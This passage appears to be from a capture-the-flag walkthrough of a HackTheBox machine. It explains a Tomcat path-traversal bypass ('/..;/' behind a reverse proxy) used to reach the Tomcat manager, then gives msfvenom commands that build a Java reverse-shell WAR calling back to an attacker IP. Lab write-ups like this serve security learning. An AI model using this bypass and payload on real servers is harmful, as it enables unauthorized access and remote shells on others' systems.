I could not find a CVE, but this blog post describes a tomcat path traversal vulenrability via reverse proxy:

When Apache Tomcat is used together with a reverse proxy such as nginx there is a nromalization inconsistency. Tomcat will threat the sequence /..;/ as /../ and normalize the path while reverse proxies will not normalize this sequence and send it to Apache Tomcat as it is.

And indeed, without the need of the client-certificate, I am able to access tomcat manager: https://seal.htb/manager/status/..;/html. From there I am able to deploy an evil WAR file with msfvenom.

msfvenom --list payloads | grep java | grep reverse
msfvenom -p java/shell_reverse_tcp  --list-options
msfvenom -p java/shell_reverse_tcp LHOST=10.10.14.44 LPORT=443 -f war -o /data/evil.war
